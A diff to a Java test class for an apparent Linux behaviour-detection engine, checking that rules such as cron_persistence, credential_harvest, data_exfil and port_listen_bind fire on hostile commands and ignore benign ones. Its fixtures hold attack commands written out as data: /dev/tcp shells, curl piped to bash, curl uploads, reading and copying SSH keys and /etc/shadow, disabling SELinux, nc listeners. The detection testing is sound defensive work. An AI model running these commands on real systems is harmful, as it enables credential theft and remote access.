@@ -54,6 +54,17 @@ class RulesTest {
           e.fields = row;
           s.add(e);
         }
+        // The historical oracle used prefix-only external-IP detection. Retain it for
+        // cases unaffected by the intentional address-classification change.
+        boolean legacyExternal = s.stream().anyMatch(e -> e.s("type").equals("Connect")
+            && !e.s("dst_ip").isEmpty() && !e.s("dst_ip").startsWith("10.")
+            && !e.s("dst_ip").startsWith("172.") && !e.s("dst_ip").startsWith("192.168."));
+        boolean currentExternal = s.stream().anyMatch(e -> e.s("type").equals("Connect")
+            && IpAddresses.scope(e.s("dst_ip")) == IpAddresses.Scope.PUBLIC);
+        if (!"tracing_sas_linux".equals(c.get("family")) && legacyExternal != currentExternal) {
+          i++;
+          continue;
+        }
         Scoring.Adjustment a =
             Scoring.adjust(
                 c.get("family").toString(),
@@ -120,7 +131,7 @@ class RulesTest {
   }
 
   @Test
-  void behaviorCountsArePerHostFullAndExcludeBeforeCounting() {
+  void behaviorCountsArePerHostFullAndIgnoreReadOnlyCronCommands() {
     DayBucket baseline = new DayBucket(), target = new DayBucket();
     for (int i = 0; i < 40; i++) {
       baseline.add(event("base" + i, "tracing_sas_linux", "2026-06-09", "a", "bash", "bash /dev/tcp/x"));
@@ -131,11 +142,11 @@ class RulesTest {
     }
     target.add(event("other", "tracing_sas_linux", "2026-06-10", "b", "bash", "bash /dev/tcp/x"));
     for (int i = 0; i < 35; i++) {
-      Event e = event("excluded" + i, "tracing_sas_linux", "2026-06-10", "c", "bash", "cat /etc/cron.d/foo");
+      Event e = event("excluded" + i, "tracing_sas_linux", "2026-06-10", "c", "bash", "crontab -l");
       e.fields.put("cmd_chain", "apt");
       target.add(e);
     }
-    target.add(event("included", "tracing_sas_linux", "2026-06-10", "c", "bash", "cat /etc/cron.d/foo"));
+    target.add(event("included", "tracing_sas_linux", "2026-06-10", "c", "bash", "echo task > /etc/cron.d/foo"));
     Map<String, DayBucket> days = new HashMap<>();
     days.put("2026-06-09", baseline); days.put("2026-06-10", target);
     List<Map<String, Object>> rows = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals();
@@ -176,6 +187,100 @@ class RulesTest {
   }
 
   @Test
+  void lateralBaselineUsesSourceUserAndAllHistoryIncludingSftp() throws Exception {
+    DayBucket baseline = new DayBucket(), target = new DayBucket();
+    Event known = event("known", "tracing_sas_linux", "2026-06-09", "a", "sftp", "sftp host");
+    known.fields.put("username", "alice"); known.fields.put("dst_ip", "fd00::1"); baseline.add(known);
+    Event unknownUser = event("unknown-user", "tracing_sas_linux", "2026-06-09", "a", "ssh", "ssh host");
+    unknownUser.fields.put("username", ""); unknownUser.fields.put("dst_ip", "fd00::1"); baseline.add(unknownUser);
+    Event unknownHost = event("unknown-host", "tracing_sas_linux", "2026-06-09", "", "ssh", "ssh host");
+    unknownHost.fields.put("username", "alice"); unknownHost.fields.put("dst_ip", "fd00::1"); baseline.add(unknownHost);
+    for (int i = 0; i < 501; i++) {
+      Event noise = event("noise" + i, "tracing_sas_linux", "2026-06-09", "c", "ssh", "ssh host");
+      noise.time += i + 1; noise.fields.put("dst_ip", "10.0.0.2"); baseline.add(noise);
+    }
+    String[] hosts = {"a", "a", "b", "a", "a", ""};
+    String[] users = {"alice", "bob", "alice", "", "alice", "alice"};
+    String[] ips = {"FD00:0:0:0:0:0:0:1", "fd00::1", "fd00::1", "fd00::1", "example.org", "fd00::1"};
+    for (int i = 0; i < hosts.length; i++) {
+      Event e = event("target" + i, "tracing_sas_linux", "2026-06-10", hosts[i], "ssh", "ssh user@host");
+      e.fields.put("username", users[i]); e.fields.put("dst_ip", ips[i]); target.add(e);
+    }
+    baseline = Json.MAPPER.readValue(Json.write(baseline), DayBucket.class);
+    target = Json.MAPPER.readValue(Json.write(target), DayBucket.class);
+    Map<String, DayBucket> days = new HashMap<>(); days.put("2026-06-09", baseline); days.put("2026-06-10", target);
+    List<Map<String, Object>> rows = new ArrayList<>();
+    for (Map<String, Object> row : MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals())
+      if ("ssh_lateral_novel_target".equals(row.get("behavior_label"))) rows.add(row);
+    assertEquals(4, rows.size());
+    assertFalse(rows.stream().anyMatch(r -> "a".equals(r.get("host_ip")) && "alice".equals(r.get("username"))));
+    assertTrue(rows.stream().anyMatch(r -> "a".equals(r.get("host_ip")) && "bob".equals(r.get("username"))));
+    assertTrue(rows.stream().anyMatch(r -> "b".equals(r.get("host_ip")) && "alice".equals(r.get("username"))));
+    assertTrue(rows.stream().anyMatch(r -> "a".equals(r.get("host_ip")) && "".equals(r.get("username"))));
+    assertTrue(rows.stream().anyMatch(r -> "".equals(r.get("host_ip")) && "alice".equals(r.get("username"))));
+  }
+
+  private static boolean behaviorHit(String label, Event event) {
+    Map<String, Object> pattern = Behavior.patterns().stream()
+        .filter(p -> label.equals(p.get("label"))).findFirst().orElseThrow(IllegalStateException::new);
+    return Behavior.matches(pattern.get("query"), event) && Behavior.included(pattern, event);
+  }
+
+  @Test
+  void operationalCommandsDoNotImplyMaliciousBehavior() {
+    String family = "tracing_sas_linux", day = "2026-06-10";
+    for (String command : J8.list("crontab -l", "crontab -u root -l", "cat /etc/cron.d/backup", "ls /var/spool/cron"))
+      assertFalse(behaviorHit("cron_persistence", event(command, family, day, "a", "bash", command)), command);
+    for (String command : J8.list("crontab -e", "crontab -u root -e", "crontab /tmp/task", "echo task >> /etc/cron.d/task", "cp /tmp/task /etc/cron.d/task"))
+      assertTrue(behaviorHit("cron_persistence", event(command, family, day, "a", "bash", command)), command);
+    for (String command : J8.list("cat /root/.ssh/known_hosts", "cat /root/.ssh/id_rsa.pub", "ls /etc/shadow", "chmod 600 /root/.ssh/id_rsa"))
+      assertFalse(behaviorHit("credential_harvest", event(command, family, day, "a", "bash", command)), command);
+    for (String command : J8.list("cat /root/.ssh/id_rsa", "cp /etc/shadow /tmp/shadow", "base64 /root/.ssh/id_ed25519"))
+      assertTrue(behaviorHit("credential_harvest", event(command, family, day, "a", "bash", command)), command);
+    assertFalse(behaviorHit("data_exfil", event("scp", family, day, "a", "scp", "scp file user@host:/tmp/file")));
+    assertTrue(behaviorHit("data_exfil", event("curl", family, day, "a", "curl", "curl -T /tmp/data https://example.org")));
+    assertFalse(behaviorHit("security_disable", event("fw", family, day, "a", "firewall-cmd", "firewall-cmd --add-port=443/tcp")));
+    assertFalse(behaviorHit("security_disable", event("iptables", family, day, "a", "iptables", "iptables -A INPUT -j ACCEPT")));
+    assertTrue(behaviorHit("security_disable", event("disable", family, day, "a", "setenforce", "setenforce 0")));
+    assertFalse(behaviorHit("port_listen_bind", event("sync", family, day, "a", "sync", "sync -l python")));
+    assertTrue(behaviorHit("port_listen_bind", event("nc", family, day, "a", "nc", "nc -l 4444")));
+    assertTrue(behaviorHit("port_listen_bind", event("python", family, day, "a", "python3", "python3 -m http.server 8000")));
+  }
+
+  @Test
+  void processAndParentNamesDoNotSuppressMatchedBehaviorInEitherChannel() {
+    Event event = event("e", "tracing_sas_linux", "2026-06-10", "a", "ansible", "cat /etc/shadow");
+    event.fields.put("cmd_chain", "[\"/usr/bin/apt update\",\"/usr/bin/docker run\"]");
+    assertTrue(behaviorHit("credential_harvest", event));
+    DayBucket bucket = new DayBucket();
+    bucket.add(event);
+    WindowMining.recordHighRisk(bucket, event);
+    Properties p = new Properties(); p.setProperty("history.compare", "false");
+    assertTrue(MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), Collections.singletonMap("2026-06-10", bucket), new MiningConfig(p)).signals().stream()
+        .anyMatch(row -> "credential_harvest".equals(row.get("behavior_label"))));
+    assertTrue(WindowMining.evaluateChannels("tracing_sas_linux", bucket, Collections.<DayBucket>emptyList(), false, new MiningConfig(p)).signals().stream()
+        .anyMatch(row -> "credential_harvest".equals(row.get("behavior_label"))));
+    Event cron = event("cron", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo x > /etc/cron.d/test");
+    cron.fields.put("cmd_chain", "[\"/opt/capture-agent\"]");
+    assertTrue(behaviorHit("cron_persistence", cron));
+    Event listener = event("listener", "tracing_sas_linux", "2026-06-10", "a", "nc", "nc -l 4444");
+    listener.fields.put("cmd_chain", "[\"/usr/bin/docker run\"]");
+    assertTrue(behaviorHit("port_listen_bind", listener));
+  }
+
+  @Test
+  void previousRuleVersionRequiresReplayEvenWithNoPriorHits() throws Exception {
+    DayBucket old = Json.MAPPER.readValue("{\"events\":1}", DayBucket.class);
+    DayBucket previous = Json.MAPPER.readValue("{\"events\":1,\"behaviorRulesVersion\":2}", DayBucket.class);
+    DayBucket sampled = Json.MAPPER.readValue("{\"events\":1,\"behaviorRulesVersion\":3}", DayBucket.class);
+    assertThrows(IllegalStateException.class, () -> old.add(event("new", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
+    assertThrows(IllegalStateException.class, () -> previous.add(event("new", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
+    assertThrows(IllegalStateException.class, () -> sampled.add(event("new", "tracing_sas_linux", "2026-06-10", "a", "bash", "echo")));
+    assertThrows(IllegalStateException.class, () -> WindowMining.evaluateChannels("tracing_sas_linux", old,
+        Collections.<DayBucket>emptyList(), false, config()));
+  }
+
+  @Test
   void baselineIsSumNotPeak() {
     Map<String, DayBucket> days = new TreeMap<String, DayBucket>();
     for (int d = 5; d <= 9; d++) {
@@ -201,7 +306,7 @@ class RulesTest {
   }
 
   @Test
-  void unseenBehaviorAfterSampleLimitDoesNotChangeTemplates() {
+  void unseenBehaviorAfterSampleLimitChangesTemplates() {
     DayBucket b = new DayBucket();
     for (int i = 0; i < 9; i++) {
       Event e =
@@ -223,7 +328,65 @@ class RulesTest {
             .filter(m -> m.get("proc_name").equals("echo"))
             .findFirst()
             .orElseThrow(IllegalStateException::new);
-    assertEquals(1, ((List<?>) s.get("novel_templates")).size());
+    assertEquals(2, ((List<?>) s.get("novel_templates")).size());
+  }
+
+  @Test
+  void structureAfterSampleLimitIsStillDetected() throws Exception {
+    Properties p = new Properties(); p.setProperty("history.compare", "false");
+    DayBucket bucket = new DayBucket();
+    for (int i = 0; i < 20; i++) {
+      Event e = event("normal" + i, "tracing_sas_linux", "2026-06-10", "a", "curl", "curl https://example.org");
+      e.time += i; bucket.add(e);
+    }
+    Event attack = event("attack", "tracing_sas_linux", "2026-06-10", "a", "curl", "curl https://example.org | bash");
+    attack.time += 100; bucket.add(attack);
+    bucket = Json.MAPPER.readValue(Json.write(bucket), DayBucket.class);
+    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"),
+        Collections.singletonMap("2026-06-10", bucket), new MiningConfig(p)).signals().stream()
+        .filter(s -> "rule_match".equals(s.get("signal_type"))).findFirst().orElseThrow(IllegalStateException::new);
+    assertTrue(((List<?>) ((Map<?, ?>) row.get("score_breakdown")).get("structural_reasons")).contains("pipe_to_interpreter"));
+    assertEquals(21L, row.get("target_count"));
+  }
+
+  @Test
+  void templateAndChainComparisonUsesFullBaselineAndTarget() {
+    DayBucket baseline = new DayBucket(), target = new DayBucket();
+    for (int i = 0; i < 14; i++) {
+      Event e = event("b" + i, "tracing_sas_linux", "2026-06-09", "a", "echo", i == 13 ? "echo known" : "echo ordinary");
+      e.time += i; e.fields.put("cmd_chain", i == 13 ? "[\"known-parent\"]" : "[\"ordinary-parent\"]"); baseline.add(e);
+    }
+    for (int i = 0; i < 31; i++) {
+      Event e = event("t" + i, "tracing_sas_linux", "2026-06-10", "a", "echo", i == 30 ? "echo novel" : "echo known");
+      e.time += i; e.fields.put("cmd_chain", i == 30 ? "[\"novel-parent\"]" : "[\"known-parent\"]"); target.add(e);
+    }
+    Map<String, DayBucket> days = new HashMap<>(); days.put("2026-06-09", baseline); days.put("2026-06-10", target);
+    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals().stream()
+        .filter(s -> "echo".equals(s.get("proc_name")) && s.containsKey("novel_templates"))
+        .findFirst().orElseThrow(IllegalStateException::new);
+    assertEquals(1, ((List<?>) row.get("novel_templates")).size());
+    assertTrue(Json.write(row.get("novel_templates")).contains("echo novel"));
+    assertTrue(Json.write(row.get("novel_chain_signatures")).contains("novel-parent"));
+    assertFalse(Json.write(row.get("novel_chain_signatures")).contains("known-parent"));
+  }
+
+  @Test
+  void baselineFetchParentPathsAreNotLimitedToMostRecentSamples() {
+    DayBucket baseline = new DayBucket(), target = new DayBucket();
+    for (int i = 0; i < 121; i++) {
+      Event e = event("b" + i, "tracing_sas_linux", "2026-06-09", "b", "curl", "curl http://example.org");
+      e.time += i; e.fields.put("cmd_chain", i == 0 ? "[\"bash /usr/bin/known-parent\"]" : "[\"bash /usr/bin/other-parent\"]");
+      baseline.add(e);
+    }
+    for (int i = 0; i < 2; i++) {
+      Event e = event("t" + i, "tracing_sas_linux", "2026-06-10", "a", "curl", "curl http://example.org");
+      e.fields.put("cmd_chain", "[\"bash /usr/bin/known-parent\"]"); target.add(e);
+    }
+    Map<String, DayBucket> days = new HashMap<>(); days.put("2026-06-09", baseline); days.put("2026-06-10", target);
+    Map<String, Object> row = MiningEngine.evaluate("tracing_sas_linux", LocalDate.parse("2026-06-10"), days, config()).signals().stream()
+        .filter(s -> "curl".equals(s.get("proc_name")) && s.containsKey("score_breakdown"))
+        .findFirst().orElseThrow(IllegalStateException::new);
+    assertFalse(((List<?>) ((Map<?, ?>) row.get("score_breakdown")).get("structural_reasons")).contains("novel_shell_parent_path"));
   }
 
   @Test
